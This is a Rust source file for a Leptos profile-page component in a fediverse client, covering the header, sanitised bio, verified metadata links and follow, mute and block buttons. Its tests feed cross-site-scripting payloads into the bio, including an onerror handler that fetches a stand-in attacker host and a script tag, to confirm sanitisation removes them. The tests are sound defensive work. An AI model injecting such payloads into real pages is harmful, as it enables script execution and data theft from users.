//! A profile: who the account is, what can be done about it, and what they posted.
//!
//! The two paints disagreed about this screen in three ways, and this component settles each
//! one: the header's fields (the server said `followers · following`, the client
//! `following · followers`), the bio (the server drew sanitised HTML, the client the text of
//! it), and the verbs (the server drew none). The first two are one tree now; the third is a
//! callback that is absent on the server, so the button keeps its box and loses only its
//! press.
//!
//! What stays with the screen is what this crate may not know: the tab strip, the cards
//! (a client card has verbs, a media viewer and a clock), the pagination control, and the
//! transport behind each verb. They arrive as slots, and the page owns their order — header,
//! tabs, the status list, then whatever the screen adds under it.

use crate::pages::settings::form::{ProfileField, is_link};
use leptos::prelude::*;
use nodus_client_core::model::{Account, Relationship, Status};

use crate::components::CardRenderer;
use crate::display_name;
use crate::status_card::StatusCard;

/// A profile header with Follow, Mute and Block, then the account's posts.
///
/// `show_statuses` hides the list without forgetting that it is empty: an account with no
/// posts and a screen showing another tab are different states, and only the screen knows
/// which one it is in.
#[component]
#[expect(
    clippy::needless_pass_by_value,
    reason = "a Leptos component receives its props by value"
)]
pub fn ProfilePage(
    /// The account this page is about.
    account: Account,
    /// How the reader stands with the account, or `None` while nobody has answered: a verb
    /// without an answer would have to guess "follow" or "unfollow".
    relationship: Option<Relationship>,
    /// The posts, as a signal so the client can append a page without rebuilding the header.
    statuses: Signal<Vec<Status>>,
    /// Whether the status list is the tab on show.
    show_statuses: bool,
    /// The screen's own tab strip, drawn between the header and the list.
    #[prop(optional)]
    tabs: Option<ChildrenFn>,
    /// The screen's own foot: the next page, another tab's list, a transport error.
    #[prop(optional)]
    after: Option<ChildrenFn>,
    /// Paints one status. Absent (the server) means the shared card without verbs.
    #[prop(optional)]
    card: Option<CardRenderer>,
    /// How old a status is, in words, from the caller's clock. Only the default card reads
    /// it; a caller that paints its own cards already owns a clock.
    #[prop(optional)]
    age_of: Option<Callback<String, String>>,
    /// Follows or unfollows; the flag says which. Absent on the server.
    #[prop(optional)]
    on_follow: Option<Callback<(String, bool)>>,
    /// Mutes or unmutes; the flag says which. Absent on the server.
    #[prop(optional)]
    on_mute: Option<Callback<(String, bool)>>,
    /// Blocks or unblocks; the flag says which. Absent on the server.
    #[prop(optional)]
    on_block: Option<Callback<(String, bool)>>,
    /// Opens the picture full size. Absent on the server, where the box is inert.
    #[prop(optional)]
    on_avatar: Option<Callback<String>>,
    /// Whether the reader can act on the relationship at all.
    #[prop(default = true)]
    show_verbs: bool,
    /// The metadata rows this account carries, or `None` when the caller has none to show.
    ///
    /// The rows the account's owner wrote, ticked where the instance verified the link.
    /// Passed only for the reader's own profile: rows belong to the signed-in account, and
    /// a visitor's page has no session to attribute them to.
    #[prop(optional)]
    fields: Option<Signal<Vec<ProfileField>>>,
) -> impl IntoView {
    let name = display_name(&account.display_name, &account.acct);
    let handle = format!("@{}", account.acct);
    let counts = format!(
        "{} posts · {} following · {} followers",
        account.statuses_count, account.following_count, account.followers_count,
    );
    // The bio is HTML from the instance, sanitised here before `inner_html`: drawing it as
    // text would show a reader the tags instead of the links, and `inner_html` is safe once
    // filtered through the shared allowlist. An empty note draws no paragraph rather than an
    // empty one.
    let bio = nodus_ui::html::body(&account.note);
    let has_bio = !bio.is_empty();
    let header = account.header.clone();
    let has_header = !header.is_empty();
    let avatar = account.avatar.clone();
    let has_avatar = !avatar.is_empty();
    let picture = StoredValue::new(avatar.clone());
    // The id is read by three handlers, so it lives in a stored value: a `String` captured
    // by value would make the first handler `FnOnce`, and a stored value is `Copy`.
    let target = StoredValue::new(account.id.clone());
    // An unanswered relationship promises no verb, so every label says nothing ("…") and
    // every button is disabled. A guessed "Follow" is a claim about state nobody has.
    let ready = relationship.is_some();
    let ((follow, follow_on), (mute, mute_on), (block, block_on)) = match relationship {
        Some(found) => (
            if found.following {
                ("Unfollow", false)
            } else {
                ("Follow", true)
            },
            if found.muting {
                ("Unmute", false)
            } else {
                ("Mute", true)
            },
            if found.blocking {
                ("Unblock", false)
            } else {
                ("Block", true)
            },
        ),
        None => (("…", false), ("…", false), ("…", false)),
    };
    // Stored for the same reason the card stores its slots: the children are taken out of
    // the page once, and a captured `ChildrenFn` would have to be cloned out of `Fn`.
    let tabs = StoredValue::new(tabs);
    let after = StoredValue::new(after);

    let rows = move || statuses.get();
    let custom = card;
    let render = move |status: Status| match custom.as_ref() {
        Some(card) => card(status),
        None => default_card(status, age_of),
    };
    let list = show_statuses.then(|| {
        view! {
            <ul class="flex flex-col gap-3">
                <For each=rows key=|status| status.id.clone() let:status>
                    {render(status)}
                </For>
            </ul>
        }
    });

    view! {
        <crate::Screen>
            <header class="card overflow-hidden border border-base-300 bg-base-100 shadow-sm">
                {has_header.then(|| view! {
                    <img class="h-32 w-full object-cover" src=header alt="" referrerpolicy="no-referrer" />
                })}
                <div class="card-body gap-3 p-4">
                    <div class="flex items-start gap-3">
                        {face(has_avatar, avatar, picture, on_avatar)}
                        <div class="min-w-0 flex-1">
                            <h1 class="truncate text-lg font-semibold">{name}</h1>
                            <p class="truncate text-sm opacity-60">{handle}</p>
                            <p class="mt-2 text-xs opacity-60">{counts}</p>
                        </div>
                    </div>
                    {has_bio
                        .then(|| {
                            view! {
                                <p
                                    class="whitespace-pre-line text-sm leading-relaxed"
                                    inner_html=bio
                                ></p>
                            }
                        })}
                    {fields.map(metadata)}
                    <Show when=move || show_verbs>
                        <div class="flex flex-wrap items-center gap-2">
                            {verb(follow, "btn btn-primary btn-sm", follow_on, target, on_follow, ready)}
                            {verb(mute, "btn btn-ghost btn-sm", mute_on, target, on_mute, ready)}
                            {verb(block, "btn btn-ghost btn-sm", block_on, target, on_block, ready)}
                        </div>
                    </Show>
                </div>
            </header>

            {tabs.with_value(|tabs| tabs.as_ref().map(|tabs| tabs()))}
            {list}
            {after.with_value(|after| after.as_ref().map(|after| after()))}
        </crate::Screen>
    }
}

/// The profile picture, in the rounded box the account row draws.
///
/// The box is drawn even with no picture, so the names beside it keep their place. Without
/// a callback the box is a `span` with the client's title and none of its affordance: the
/// server paints the same rectangle the client boots in, and a picture that is not there
/// would move the name by twelve units.
fn face(
    has_avatar: bool,
    avatar: String,
    source: StoredValue<String>,
    on_avatar: Option<Callback<String>>,
) -> AnyView {
    let picture = has_avatar.then(|| {
        view! {
            <img
                class="h-16 w-16 rounded-full object-cover"
                width="64"
                height="64"
                decoding="async"
                loading="lazy"
                src=avatar
                alt=""
                referrerpolicy="no-referrer"
            />
        }
    });
    if let Some(on_avatar) = on_avatar {
        return view! {
            <button
                class="avatar cursor-zoom-in"
                type="button"
                title="Expand picture"
                on:click=move |_| on_avatar.run(source.get_value())
            >
                <div class="w-16 rounded-full bg-base-300">{picture}</div>
            </button>
        }
        .into_any();
    }
    view! {
        <span class="avatar cursor-default pointer-events-none" title="Expand picture">
            <div class="w-16 rounded-full bg-base-300">{picture}</div>
        </span>
    }
    .into_any()
}

/// The metadata rows, under the bio: a label and what it points at.
///
/// The block is absent when there are no rows, and each value is a `rel="me"` link only
/// when it is one: the mark says the instance verified a link, so a tick beside a sentence
/// would be a claim about something the instance never checked.
fn metadata(fields: Signal<Vec<ProfileField>>) -> AnyView {
    view! {
        <Show when=move || !fields.get().is_empty()>
            <dl class="mt-2 flex flex-col gap-1 text-sm">
                {move || fields.get().into_iter().map(metadata_row).collect_view()}
            </dl>
        </Show>
    }
    .into_any()
}

/// One metadata row: the label, then the value and the instance's verdict on it.
fn metadata_row(field: ProfileField) -> AnyView {
    let value = field.value.trim().to_owned();
    let linked = is_link(&value);
    let shown = if linked {
        view! { <a class="link" rel="me" href=value.clone()>{value.clone()}</a> }.into_any()
    } else {
        view! { <span>{value.clone()}</span> }.into_any()
    };
    let mark = field.verified_at.is_some().then(|| {
        view! {
            <span class="badge badge-success badge-xs ml-1" role="img" aria-label="Verified link">
                "✔"
            </span>
        }
    });
    view! {
        <div class="flex gap-2">
            <dt class="shrink-0 font-semibold">{field.name}</dt>
            <dd class="min-w-0 break-all">{shown}{mark}</dd>
        </div>
    }
    .into_any()
}

/// One relationship verb, in the client's box.
///
/// The button is disabled rather than absent where there is no callback or no relationship:
/// the server paints the whole row the client does, and a control that is missing is a row
/// whose width changes when the client boots.
fn verb(
    label: &'static str,
    class: &'static str,
    on: bool,
    target: StoredValue<String>,
    send: Option<Callback<(String, bool)>>,
    ready: bool,
) -> AnyView {
    let disabled = !ready || send.is_none();
    view! {
        <button
            class=class
            disabled=disabled
            on:click=move |_| {
                if let Some(send) = send {
                    send.run((target.get_value(), on));
                }
            }
        >
            {label}
        </button>
    }
    .into_any()
}

/// The card the server paints and the client's fallback: the shared card with no verbs.
///
/// A boost's age belongs to the boosted post, which is the line the card draws.
fn default_card(status: Status, age_of: Option<Callback<String, String>>) -> AnyView {
    let created_at = status
        .reblog
        .as_ref()
        .map_or(status.created_at.as_str(), |inner| {
            inner.created_at.as_str()
        })
        .to_owned();
    let age = age_of.map_or_else(String::new, |age_of| age_of.run(created_at));
    let inner = status.reblog.as_deref().unwrap_or(&status);
    let host = nodus_web::shared::handles::host_of_acct(&inner.account.acct).or_else(|| {
        inner
            .url
            .as_deref()
            .and_then(nodus_web::shared::handles::host_of_url)
    });
    let author_path = nodus_web::shared::handles::profile_path_for(&inner.account.acct, host);
    let thread_path = nodus_web::shared::handles::status_path(host, &inner.id);
    view! {
        <StatusCard
            status=status
            age=age
            author_path=author_path
            thread_path=thread_path
            interactive=false
        />
    }
    .into_any()
}

#[cfg(test)]
mod tests {
    use leptos::prelude::{Owner, RenderHtml as _, Signal};
    use nodus_client_core::model::Account;

    use super::{ProfilePage, ProfilePageProps};

    fn render_profile_note(note: &str) -> String {
        let account = Account {
            id: "1".to_owned(),
            acct: "alice@example.org".to_owned(),
            display_name: "Alice".to_owned(),
            note: note.to_owned(),
            avatar: String::new(),
            header: String::new(),
            bot: false,
            locked: false,
            followers_count: 0,
            following_count: 0,
            statuses_count: 0,
            last_status_at: None,
            discoverable: None,
            indexable: None,
            noindex: None,
            fields: Vec::new(),
        };
        Owner::new().with(|| {
            let statuses = Signal::derive(Vec::new);
            ProfilePage(ProfilePageProps {
                account,
                relationship: None,
                statuses,
                show_statuses: true,
                tabs: None,
                after: None,
                card: None,
                age_of: None,
                on_follow: None,
                on_mute: None,
                on_block: None,
                on_avatar: None,
                show_verbs: false,
                fields: None,
            })
            .to_html()
        })
    }

    #[test]
    fn profile_page_sanitizes_account_note_xss() {
        let rendered = render_profile_note(
            "<p>bio</p><img src=x onerror=\"fetch('https://attacker.tld')\"><script>steal()</script>",
        );
        assert!(!rendered.contains("onerror"), "{rendered}");
        assert!(!rendered.contains("attacker.tld"), "{rendered}");
        assert!(!rendered.contains("<script"), "{rendered}");
        assert!(rendered.contains("<p>bio</p>"), "{rendered}");
    }

    #[test]
    fn profile_page_blocks_unclosed_tag_and_open_quote_xss_on_ssr() {
        for payload in [
            "<img src=x onerror=\"alert(1)\" ",
            "<img src=x onerror=\"alert(1)\" alt=\"",
        ] {
            let rendered = render_profile_note(payload);
            assert!(!rendered.contains("<img"), "{rendered}");
            assert!(!rendered.contains("onerror"), "{rendered}");
            assert!(!rendered.contains("alert(1)"), "{rendered}");
        }
    }
}
